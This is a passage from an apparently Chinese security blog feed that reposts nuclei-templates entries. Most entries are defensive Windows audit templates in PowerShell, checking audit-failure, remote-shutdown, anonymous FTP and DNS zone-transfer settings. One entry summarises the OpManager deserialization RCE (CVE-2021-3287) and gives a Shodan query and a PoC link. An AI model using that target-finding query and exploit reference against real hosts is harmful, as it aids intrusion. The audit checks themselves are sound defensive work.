|<br>      $cfgPath <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\c</span>fg.txt&quot;</span><br>      secedit <span class="hljs-symbol">/export</span> <span class="hljs-symbol">/cfg</span> $cfgPath | Out-Null<br>      $cfg <span class="hljs-operator">=</span> Get-Content $cfgPath | Out-String<br>      <span class="hljs-keyword">if</span> ($cfg <span class="hljs-operator">-</span>match <span class="hljs-string">&quot;CrashOnAuditFail<span class="hljs-char escape_">\s</span>*=<span class="hljs-char escape_">\s</span>*(<span class="hljs-char escape_">\S</span>+)&quot;</span>) &#123;<br>          $value <span class="hljs-operator">=</span> $Matches[<span class="hljs-number">1</span>].Trim()<br>          <span class="hljs-keyword">if</span> ($value <span class="hljs-operator">-</span>eq <span class="hljs-string">&quot;4,1&quot;</span>) &#123;<br>              <span class="hljs-string">&quot;CRASH_ON_AUDIT_FAIL_ENABLED&quot;</span><br>          &#125; <span class="hljs-keyword">else</span> &#123;<br>              <span class="hljs-string">&quot;CRASH_ON_AUDIT_FAIL_DISABLED&quot;</span><br>          &#125;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-string">&quot;CRASH_ON_AUDIT_FAIL_NOT_FOUND&quot;</span><br>      &#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;CRASH_ON_AUDIT_FAIL_ENABLED&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Windows Server Shutdown on Audit Failur</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="配置问题" scheme="http://example.com/tags/%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Zoho ManageEngine OpManager 反序列化漏洞</title>
    <link href="http://example.com/2025/06/26/github_4254263973/"/>
    <id>http://example.com/2025/06/26/github_4254263973/</id>
    <published>2025-06-26T11:17:39.912Z</published>
    <updated>2025-06-26T11:17:39.912Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Zoho ManageEngine OpManager 反序列化漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2021-3287</li></ul><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Zoho ManageEngine OpManager在12.5.329之前的版本中，由于反序列化类的通用绕过，允许未经身份验证的远程代码执行。</p><p><strong>产品厂商：</strong> Zoho</p><p><strong>产品名称：</strong> ManageEngine OpManager</p><p><strong>影响版本：</strong> version &lt; 12.5.329</p><p><strong>搜索语法：</strong> http.title:”opmanager”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12474">https://github.com/projectdiscovery/nuclei-templates/issues/12474</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>Zoho ManageEngine OpManager before 12.5.329 allows unauthenticated Remote Code Execution due to a general bypass in the deserialization class.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="http://packetstormsecurity.com/files/164231/ManageEngine-OpManager-SumPDU-Java-Deserialization.html">http://packetstormsecurity.com/files/164231/ManageEngine-OpManager-SumPDU-Java-Deserialization.html</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-title-opmanager"><a href="#Shodan-Query-http-title-opmanager" class="headerlink" title="Shodan Query: http.title:&quot;opmanager&quot;"></a>Shodan Query: <code>http.title:&quot;opmanager&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Zoho ManageEngine OpManager 反序列化漏洞&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Remote System Forced Shutdown Privilege Check</title>
    <link href="http://example.com/2025/06/26/github_3759353471/"/>
    <id>http://example.com/2025/06/26/github_3759353471/</id>
    <published>2025-06-26T11:17:24.236Z</published>
    <updated>2025-06-26T11:17:24.236Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Remote System Forced Shutdown Privilege Check</p><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 确保“从远程系统强制关机”策略（SeRemoteShutdownPrivilege）仅分配给管理员组（SID: S-1-5-32-544）。将此权限授予未经授权的账户可能允许攻击者远程关闭系统，构成重大风险。</p><p><strong>产品名称：</strong> Windows Server</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fremote-system-shutdown.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fremote-system-shutdown.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> remote-system-shutdown<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Remote System Forced Shutdown Privilege Check<br>  <span class="hljs-params">author:</span> nukunga[SungHyunJeon]<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> |<br>    Ensure the <span class="hljs-string">&quot;Force shutdown from a remote system&quot;</span> policy (SeRemoteShutdownPrivilege) is assigned only to the Administrators group (<span class="hljs-params">SID:</span> S-<span class="hljs-number">1</span><span class="hljs-operator">-</span><span class="hljs-number">5</span><span class="hljs-operator">-</span><span class="hljs-number">3</span>2-<span class="hljs-number">544</span>). Granting this privilege to unauthorized accounts can allow attackers to remotely shut down the system, posing a significant risk.<br>  <span class="hljs-params">impact:</span> |<br>    Granting this privilege to accounts <span class="hljs-keyword">or</span> groups other than Administrators can be exploited to carry out unauthorized remote shutdowns, resulting <span class="hljs-keyword">in</span> service disruptions <span class="hljs-keyword">or</span> denial-of-service conditions.<br>  <span class="hljs-params">remediation:</span> |<br>    Configure the policy to grant the SeRemoteShutdownPrivilege exclusively to the Administrators group by setting its value to S-<span class="hljs-number">1</span><span class="hljs-operator">-</span><span class="hljs-number">5</span><span class="hljs-operator">-</span><span class="hljs-number">3</span>2-<span class="hljs-number">544</span> only.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>isms.kisa.<span class="hljs-keyword">or</span>.kr<span class="hljs-operator">/</span>main<span class="hljs-operator">/</span>csap<span class="hljs-operator">/</span>notice<span class="hljs-operator">/</span><span class="hljs-operator">?</span>boardId<span class="hljs-operator">=</span>bbs_0000000000000004&amp;mode<span class="hljs-operator">=</span>view&amp;cntId<span class="hljs-operator">=</span><span class="hljs-number">85</span><br>  <span class="hljs-params">tags:</span> policy,code,windows-audit,kisa<br><br><span class="hljs-params">self-contained:</span> <span class="hljs-literal">true</span><br><br><span class="hljs-params">code:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">pre-condition:</span> |<br>      IsWindows();<br>    <span class="hljs-params">engine:</span><br>      <span class="hljs-operator">-</span> powershell<br>      <span class="hljs-operator">-</span> powershell.exe<br>    <span class="hljs-params">args:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-operator">-</span>ExecutionPolicy<br>      <span class="hljs-operator">-</span> Bypass<br>    <span class="hljs-params">pattern:</span> <span class="hljs-string">&quot;*.ps1&quot;</span><br>    <span class="hljs-params">source:</span> |<br>      <span class="hljs-comment"># Export the current security settings to a configuration file.</span><br>      $cfgPath <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\c</span>fg.txt&quot;</span><br>      secedit <span class="hljs-symbol">/export</span> <span class="hljs-symbol">/cfg</span> $cfgPath | Out-Null<br>      <span class="hljs-comment"># Read the exported configuration file.</span><br>      $cfg <span class="hljs-operator">=</span> Get-Content $cfgPath | Out-String<br>      <span class="hljs-comment"># Extract the SeRemoteShutdownPrivilege value.</span><br>      <span class="hljs-keyword">if</span> ($cfg <span class="hljs-operator">-</span>match <span class="hljs-string">&quot;SeRemoteShutdownPrivilege<span class="hljs-char escape_">\s</span>*=<span class="hljs-char escape_">\s</span>*(.*)&quot;</span>) &#123;<br>          $privs <span class="hljs-operator">=</span> $Matches[<span class="hljs-number">1</span>].Trim()<br>          <span class="hljs-comment"># Check if only the Administrators SID (S-1-5-32-544) is present.</span><br>          <span class="hljs-keyword">if</span> ($privs <span class="hljs-operator">-</span>eq <span class="hljs-string">&quot;S-1-5-32-544&quot;</span>) &#123;<br>              <span class="hljs-string">&quot;REMOTE_SHUTDOWN_PRIVILEGE_COMPLIANT&quot;</span><br>          &#125; <span class="hljs-keyword">else</span> &#123;<br>              <span class="hljs-string">&quot;REMOTE_SHUTDOWN_PRIVILEGE_VULNERABLE&quot;</span><br>          &#125;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-string">&quot;REMOTE_SHUTDOWN_PRIVILEGE_NOT_FOUND&quot;</span><br>      &#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;REMOTE_SHUTDOWN_PRIVILEGE_VULNERABLE&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Remote System Forced Shutdown Privilege</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>IIS Anonymous FTP Authentication Vulnerability</title>
    <link href="http://example.com/2025/06/26/github_1048629150/"/>
    <id>http://example.com/2025/06/26/github_1048629150/</id>
    <published>2025-06-26T11:17:12.558Z</published>
    <updated>2025-06-26T11:17:12.555Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> IIS Anonymous FTP Authentication Vulnerability</p><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 确保在所有FTP站点上禁用匿名FTP认证。允许匿名访问允许未经认证的用户连接，这可能导致严重的安全漏洞。如果启用了匿名FTP，攻击者可以绕过认证，可能获得对FTP资源的未授权访问，构成重大安全风险。</p><p><strong>产品厂商：</strong> Microsoft</p><p><strong>产品名称：</strong> IIS</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fftp-anonymous-check.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fftp-anonymous-check.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><br>id: ftp<span class="hljs-literal">-anonymous-check</span><br><br>info:<br>  name: Anonymous FTP Disabled Check<br>  author: nukunga[<span class="hljs-type">SungHyunJeon</span>]<br>  severity: medium<br>  description: |<br>    Ensure that anonymous FTP authentication is disabled on all FTP sites. Allowing anonymous access permits unauthenticated users to connect, which can lead to serious security vulnerabilities.<br>  impact: |<br>    <span class="hljs-keyword">If</span> anonymous FTP is enabled, attackers can bypass authentication and potentially gain unauthorized access to FTP resources, posing a significant security risk.<br>  remediation: |<br>    Disable anonymous FTP authentication <span class="hljs-keyword">using</span> IIS Manager:<br>    - Open IIS Manager.<br>    - Navigate to the FTP site → FTP Authentication.<br>    - <span class="hljs-built_in">Set</span> <span class="hljs-string">&quot;Anonymous Authentication&quot;</span> to Disabled.<br>  reference:<br>    - https://isms.kisa.or.kr/main/csap/notice/?boardId=bbs_0000000000000004&amp;mode=view&amp;cntId=<span class="hljs-number">85</span><br>  tags: ftp,iis,security,code,windows<span class="hljs-literal">-audit</span>,kisa<br><br>self<span class="hljs-literal">-contained</span>: true<br><br>code:<br>  - pre<span class="hljs-literal">-condition</span>: |<br>      IsWindows();<br>    engine:<br>      - powershell<br>      - powershell.exe<br>    args:<br>      - <span class="hljs-literal">-ExecutionPolicy</span><br>      - Bypass<br>    pattern: <span class="hljs-string">&quot;*.ps1&quot;</span><br>    source: |<br>      <span class="hljs-built_in">Import-Module</span> WebAdministration <span class="hljs-literal">-ErrorAction</span> SilentlyContinue<br>      <span class="hljs-variable">$ftpSites</span> = <span class="hljs-built_in">Get-ChildItem</span> IIS:\Sites | <span class="hljs-built_in">Where-Object</span> &#123; <span class="hljs-variable">$_</span>.Bindings.Collection.Protocol <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;ftp&quot;</span> &#125;<br>      <span class="hljs-variable">$vulnerable</span> = <span class="hljs-variable">$false</span><br>      <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$site</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$ftpSites</span>) &#123;<br>          <span class="hljs-variable">$anonAuth</span> = <span class="hljs-built_in">Get-WebConfigurationProperty</span> <span class="hljs-literal">-pspath</span> <span class="hljs-string">&quot;MACHINE/WEBROOT/APPHOST/<span class="hljs-variable">$</span>(<span class="hljs-variable">$site</span>.Name)&quot;</span> <span class="hljs-literal">-filter</span> <span class="hljs-string">&quot;system.ftpServer/security/authentication/anonymousAuthentication&quot;</span> <span class="hljs-literal">-name</span> <span class="hljs-string">&quot;enabled&quot;</span> <span class="hljs-literal">-ErrorAction</span> SilentlyContinue<br>          <span class="hljs-keyword">if</span> (<span class="hljs-variable">$anonAuth</span> <span class="hljs-operator">-eq</span> <span class="hljs-variable">$true</span>) &#123;<br>              <span class="hljs-variable">$vulnerable</span> = <span class="hljs-variable">$true</span><br>              <span class="hljs-keyword">break</span><br>          &#125;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$vulnerable</span>) &#123;<br>          <span class="hljs-string">&quot;ANONYMOUS_FTP_ENABLED&quot;</span><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-string">&quot;ANONYMOUS_FTP_DISABLED&quot;</span><br>      &#125;<br><br>    matchers:<br>      - <span class="hljs-built_in">type</span>: word<br>        words:<br>          - <span class="hljs-string">&quot;ANONYMOUS_FTP_ENABLED&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; IIS Anonymous FTP Authentication Vulner</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
  </entry>
  
  <entry>
    <title>DNS Zone Transfer Check Vulnerability</title>
    <link href="http://example.com/2025/06/26/github_367444957/"/>
    <id>http://example.com/2025/06/26/github_367444957/</id>
    <published>2025-06-26T11:16:52.814Z</published>
    <updated>2025-06-26T11:16:52.811Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> DNS Zone Transfer Check Vulnerability</p><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> DNS区域传输未正确限制可能导致敏感域信息泄露，攻击者可以利用这些信息映射网络基础设施。通过验证所有活动区域的SecureSecondaries注册表值是否设置为2，可以确保DNS区域传输受到限制。</p><p><strong>产品厂商：</strong> Microsoft</p><p><strong>产品名称：</strong> DNS Server</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fdns-zone-transfer-check.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fdns-zone-transfer-check.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> dns-zone-transfer-check<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> DNS Zone Transfer Check<br>  <span class="hljs-params">author:</span> nukunga[SungHyunJeon]<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> |<br>    Ensure DNS zone transfers are restricted by verifying that the SecureSecondaries registry value is set to <span class="hljs-number">2</span> for all active zones.<br>    Unrestricted zone transfers can expose sensitive domain information, helping attackers <span class="hljs-built_in">map</span> the network infrastructure.<br>  <span class="hljs-params">impact:</span> |<br>    If DNS zone transfers are not properly restricted, attackers could access domain and zone details, which may aid <span class="hljs-keyword">in</span> planning and launching further attacks against the network infrastructure.<br>  <span class="hljs-params">remediation:</span> |<br>    Configure DNS zone transfer restrictions <span class="hljs-params">by:</span><br>    <span class="hljs-operator">-</span> Disabling zone transfers entirely, <span class="hljs-keyword">or</span><br>    <span class="hljs-operator">-</span> Restricting transfers to designated servers by setting the SecureSecondaries registry value to <span class="hljs-number">2</span>.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>isms.kisa.<span class="hljs-keyword">or</span>.kr<span class="hljs-operator">/</span>main<span class="hljs-operator">/</span>csap<span class="hljs-operator">/</span>notice<span class="hljs-operator">/</span><span class="hljs-operator">?</span>boardId<span class="hljs-operator">=</span>bbs_0000000000000004&amp;mode<span class="hljs-operator">=</span>view&amp;cntId<span class="hljs-operator">=</span><span class="hljs-number">85</span><br>  <span class="hljs-params">tags:</span> code,windows-audit,kisa,dns,zone-transfer<br><br><span class="hljs-params">self-contained:</span> <span class="hljs-literal">true</span><br><br><span class="hljs-params">code:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">pre-condition:</span> |<br>      IsWindows();<br>    <span class="hljs-params">engine:</span><br>      <span class="hljs-operator">-</span> powershell<br>      <span class="hljs-operator">-</span> powershell.exe<br>    <span class="hljs-params">args:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-operator">-</span>ExecutionPolicy<br>      <span class="hljs-operator">-</span> Bypass<br>    <span class="hljs-params">pattern:</span> <span class="hljs-string">&quot;*.ps1&quot;</span><br>    <span class="hljs-params">source:</span> |<br>      $regPath <span class="hljs-operator">=</span> <span class="hljs-string">&quot;HKLM:<span class="hljs-char escape_">\S</span>OFTWARE<span class="hljs-char escape_">\M</span>icrosoft<span class="hljs-char escape_">\W</span>indowsNT<span class="hljs-char escape_">\C</span>urrentVersion<span class="hljs-char escape_">\D</span>NS Server<span class="hljs-char escape_">\Z</span>ones&quot;</span><br>      $zones <span class="hljs-operator">=</span> Get-ChildItem <span class="hljs-operator">-</span>Path $regPath <span class="hljs-operator">-</span>ErrorAction SilentlyContinue<br>      <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span>$zones) &#123;<br>          <span class="hljs-string">&quot;DNS_ZONE_TRANSFER_COMPLIANT&quot;</span><br>          exit<br>      &#125;<br>      $vulnerable <span class="hljs-operator">=</span> $<span class="hljs-literal">false</span><br>      foreach ($zone <span class="hljs-keyword">in</span> $zones) &#123;<br>          $secureVal <span class="hljs-operator">=</span> (Get-ItemProperty <span class="hljs-operator">-</span>Path $zone.PSPath <span class="hljs-operator">-</span>ErrorAction SilentlyContinue).SecureSecondaries<br>          <span class="hljs-keyword">if</span> ($secureVal <span class="hljs-operator">-</span>ne <span class="hljs-number">2</span>) &#123;<br>              $vulnerable <span class="hljs-operator">=</span> $<span class="hljs-literal">true</span><br>              break<br>          &#125;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ($vulnerable) &#123;<br>          <span class="hljs-string">&quot;DNS_ZONE_TRANSFER_VULNERABLE&quot;</span><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-string">&quot;DNS_ZONE_TRANSFER_COMPLIANT&quot;</span><br>      &#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;DNS_ZONE_TRANSFER_VULNERABLE&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; DNS Zone Transfer Check Vulnerability&lt;/</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>FTP Access Control Check</title>
    <link href="http://example.com/2025/06/26/github_339900183/"/>
    <id>http://example.com/2025/06/26/github_339900183/</id>
    <published>2025-06-26T11:16:37.485Z</published>
    <updated>2025-06-26T11:16:37.483Z</updated>
    
